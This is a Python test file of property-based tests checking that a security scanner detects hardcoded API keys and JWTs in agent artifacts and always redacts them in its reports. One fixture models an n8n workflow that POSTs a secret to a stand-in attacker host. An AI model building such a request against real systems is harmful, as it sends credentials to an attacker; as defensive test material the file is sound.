"""Property-based redaction tests (build-loop task #44).

The scanner detects hardcoded credentials in agent artifacts and must NEVER
re-emit a live secret in plaintext: a finding description that quoted the full
key would itself be a leak (it flows into CI logs, the `--json` report, and the
SARIF artifact uploaded to GitHub code scanning). `test_agent_supply_chain.py`
already pins this with a handful of fixed example credentials; this module
strengthens that into a *property*: for ANY structurally-valid credential of
every supported shape, embedded in every artifact class the scanner reads, the
raw secret appears nowhere in the serialized finding output — only the masked
form (`<4-char type prefix>…[redacted, N chars]`).

Hypothesis explores the full generated space of each credential family, so a
future change to a detection/masking path that leaks even one shape is caught
deterministically (the failing credential is minimized and replayed).

`hypothesis` is a dev dependency; the module skips cleanly if it is absent so a
minimal (non-dev) install can still collect the suite.
"""

import base64
import json
import string
import sys
import tempfile
from pathlib import Path

import pytest

hypothesis = pytest.importorskip("hypothesis")
from hypothesis import HealthCheck, given, settings  # noqa: E402
from hypothesis import strategies as st  # noqa: E402

SRC = Path(__file__).resolve().parents[1] / "src"
if str(SRC) not in sys.path:
    sys.path.insert(0, str(SRC))

from scanners.agent_supply_chain import AgentSupplyChainScanner  # noqa: E402

# A single free-tier scanner is reused across examples: scan_directory builds a
# fresh ScanResult per call, so there is no cross-example state to leak. pro=False
# pins the free tier (the secret rules are free-tier), making detection
# deterministic regardless of any license on the host.
_SCANNER = AgentSupplyChainScanner(pro=False)

# Character classes mirroring the credential regexes in agent_supply_chain.py.
_DIGITS = string.digits
_UPPER_NUM = string.ascii_uppercase + string.digits          # [0-9A-Z]
_ALNUM = string.ascii_letters + string.digits                # [A-Za-z0-9]
_B64URL = _ALNUM + "_-"                                       # [A-Za-z0-9_-]
_SLACK_BODY = _ALNUM + "-"                                    # [A-Za-z0-9-]


def _seg(alphabet: str, n: int):
    return st.text(alphabet=alphabet, min_size=n, max_size=n)


def _seg_range(alphabet: str, lo: int, hi: int):
    return st.text(alphabet=alphabet, min_size=lo, max_size=hi)


# --- AGENT-SECRET-001 family (AKIA / ghp_ / xox / sk- / AIza) ------------------
_aws_key = st.builds(lambda b: "AKIA" + b, _seg(_UPPER_NUM, 16))
_github_pat = st.builds(lambda b: "ghp_" + b, _seg(_ALNUM, 36))
_slack_token = st.builds(
    lambda t, b: f"xox{t}-{b}", st.sampled_from("baprs"), _seg_range(_SLACK_BODY, 12, 30)
)
_openai_key = st.builds(
    lambda mid, b: f"sk-{mid}{b}",
    st.sampled_from(["", "ant-", "proj-"]),
    _seg_range(_B64URL, 24, 40),
)
_google_key = st.builds(lambda b: "AIza" + b, _seg(_B64URL, 35))

# --- AGENT-SECRET-002 family (Stripe / Telegram / Discord) --------------------
_stripe_key = st.builds(
    lambda p, b: f"{p}k_live_{b}", st.sampled_from("sr"), _seg_range(_ALNUM, 28, 44)
)
_telegram_token = st.builds(
    lambda i, b: f"{i}:AA{b}", _seg_range(_DIGITS, 8, 10), _seg_range(_B64URL, 30, 40)
)
_discord_token = st.builds(
    lambda head, mid, tail: f"{head}.{mid}.{tail}",
    st.builds(lambda c, b: c + b, st.sampled_from("MNO"), _seg_range(_B64URL, 23, 25)),
    _seg(_B64URL, 6),
    _seg_range(_B64URL, 27, 38),
)

# SECRET_RULE (001) shapes only — the n8n direct-embed path matches against this rule.
_secret1_family = st.one_of(_aws_key, _github_pat, _slack_token, _openai_key, _google_key)
# Every hardcoded-secret shape the prose / MCP paths can flag.
_any_secret = st.one_of(_secret1_family, _stripe_key, _telegram_token, _discord_token)


@st.composite
def _service_role_jwts(draw) -> str:
    """A structurally valid (unsigned) Supabase service_role JWT.

    Only the decoded ``role`` claim distinguishes the RLS-bypassing service_role
    secret from the safe-to-ship anon key, so the scanner decodes the payload —
    we vary ``ref``/``iat`` but pin ``role`` to service_role so every example is
    a genuine secret that must be detected and redacted.
    """
    ref = draw(st.text(alphabet=string.ascii_lowercase + string.digits, min_size=4, max_size=20))
    iat = draw(st.integers(min_value=1_000_000_000, max_value=2_000_000_000))

    def seg(obj: dict) -> str:
        raw = json.dumps(obj, separators=(",", ":")).encode()
        return base64.urlsafe_b64encode(raw).rstrip(b"=").decode()

    header = seg({"alg": "HS256", "typ": "JWT"})
    payload = seg({"iss": "supabase", "ref": ref, "role": "service_role", "iat": iat})
    sig = base64.urlsafe_b64encode(b"not-a-real-signature-" + ref.encode()).rstrip(b"=").decode()
    return f"{header}.{payload}.{sig}"


# A relaxed deadline + suppressed too-slow check: every example does real
# filesystem I/O + a full scan, which is inherently slower than Hypothesis's
# 200ms default per-example budget.
_FS_SETTINGS = settings(
    max_examples=60,
    deadline=None,
    suppress_health_check=[HealthCheck.too_slow],
)


def _assert_no_leak(secret: str, result) -> None:
    """The raw secret must appear nowhere in any serialized finding output."""
    secret_findings = [
        f for f in result.findings
        if f.cve_id.startswith("AGENT-SECRET") or f.cve_id == "AGENT-N8N-002"
    ]
    assert secret_findings, f"secret was not detected at all: {secret[:6]}…"
    # The canonical serialized form every downstream report (human / --json /
    # SARIF) derives finding text from. If the secret is absent here, it is
    # absent everywhere.
    blob = json.dumps(result.to_dict(), ensure_ascii=False)
    assert secret not in blob, "raw secret leaked into the serialized scan result"
    for f in secret_findings:
        for fieldval in (f.description, f.title, f.remediation or "", f.file_path,
                         json.dumps(f.raw_data, ensure_ascii=False)):
            assert secret not in fieldval, f"raw secret leaked into a finding field: {f.cve_id}"
        assert "[redacted" in f.description, f"no redaction marker in {f.cve_id} evidence"


@given(secret=_any_secret)
@_FS_SETTINGS
def test_skill_prose_secret_never_unredacted(secret):
    with tempfile.TemporaryDirectory() as d:
        (Path(d) / "SKILL.md").write_text(
            f"# Helper skill\n\nDeploy step:\n\n    KEY={secret}\n", encoding="utf-8"
        )
        _assert_no_leak(secret, _SCANNER.scan_directory(d))


@given(secret=_any_secret)
@_FS_SETTINGS
def test_instruction_file_secret_never_unredacted(secret):
    with tempfile.TemporaryDirectory() as d:
        (Path(d) / "CLAUDE.md").write_text(
            f"Project notes.\n\nCI token: {secret}\n", encoding="utf-8"
        )
        _assert_no_leak(secret, _SCANNER.scan_directory(d))


@given(secret=_any_secret)
@_FS_SETTINGS
def test_mcp_env_secret_never_unredacted(secret):
    config = {
        "mcpServers": {
            "svc": {"command": "npx", "args": ["-y", "some-mcp"], "env": {"API_KEY": secret}}
        }
    }
    with tempfile.TemporaryDirectory() as d:
        (Path(d) / "mcp.json").write_text(json.dumps(config, indent=2), encoding="utf-8")
        _assert_no_leak(secret, _SCANNER.scan_directory(d))


@given(secret=_secret1_family)
@_FS_SETTINGS
def test_n8n_direct_embed_secret_never_unredacted(secret):
    # Condition B of AGENT-N8N-002: a node ships a hardcoded key to an external
    # host in the request itself. The structured path masks the embedded key.
    workflow = {
        "name": "wf",
        "nodes": [
            {
                "name": "HTTP Request",
                "type": "n8n-nodes-base.httpRequest",
                "parameters": {
                    "method": "POST",
                    "url": "https://collector.attacker.example/in",
                    "headerParameters": {"parameters": [{"name": "X-Tok", "value": secret}]},
                },
            }
        ],
        "connections": {},
    }
    with tempfile.TemporaryDirectory() as d:
        (Path(d) / "workflow.json").write_text(json.dumps(workflow, indent=2), encoding="utf-8")
        _assert_no_leak(secret, _SCANNER.scan_directory(d))


@given(jwt=_service_role_jwts())
@_FS_SETTINGS
def test_service_role_jwt_never_unredacted_in_skill(jwt):
    with tempfile.TemporaryDirectory() as d:
        (Path(d) / "SKILL.md").write_text(
            f"# Data skill\n\nSUPABASE_KEY={jwt}\n", encoding="utf-8"
        )
        result = _SCANNER.scan_directory(d)
        findings = [f for f in result.findings if f.cve_id == "AGENT-SECRET-002"]
        assert findings, "service_role JWT was not detected"
        blob = json.dumps(result.to_dict(), ensure_ascii=False)
        assert jwt not in blob, "service_role JWT leaked into the serialized scan result"
        for f in findings:
            assert jwt not in f.description
            assert "[redacted" in f.description


@given(jwt=_service_role_jwts())
@_FS_SETTINGS
def test_service_role_jwt_never_unredacted_in_mcp_env(jwt):
    config = {
        "mcpServers": {
            "data": {"command": "npx", "args": ["-y", "data-mcp"], "env": {"SUPABASE_KEY": jwt}}
        }
    }
    with tempfile.TemporaryDirectory() as d:
        (Path(d) / "mcp.json").write_text(json.dumps(config, indent=2), encoding="utf-8")
        result = _SCANNER.scan_directory(d)
        findings = [f for f in result.findings if f.cve_id == "AGENT-SECRET-002"]
        assert findings, "service_role JWT in MCP env was not detected"
        blob = json.dumps(result.to_dict(), ensure_ascii=False)
        assert jwt not in blob, "service_role JWT leaked into the serialized scan result"
        for f in findings:
            assert jwt not in f.description
            assert "[redacted" in f.description


# --- Foundational property on the masking primitive itself --------------------
# Fast (no filesystem): exercises _mask_secret directly over arbitrary text so
# the guarantee holds for inputs the credential strategies above do not cover.
@given(value=st.text(min_size=9, max_size=400))
@settings(max_examples=300, deadline=None)
def test_mask_secret_primitive_never_echoes_full_value(value):
    collapsed = "".join(value.split())
    # _mask_secret returns a bare "[redacted]" for <=8 (post-strip) chars; the
    # informative prefix+length form only applies above that threshold.
    if len(collapsed) <= 8:
        return
    masked = AgentSupplyChainScanner._mask_secret(value)
    assert collapsed not in masked, "full (whitespace-collapsed) value survived masking"
    assert "[redacted" in masked
    # Only a short type-recognition prefix (<=4 chars) of the secret may remain.
    assert masked.startswith(collapsed[:4])
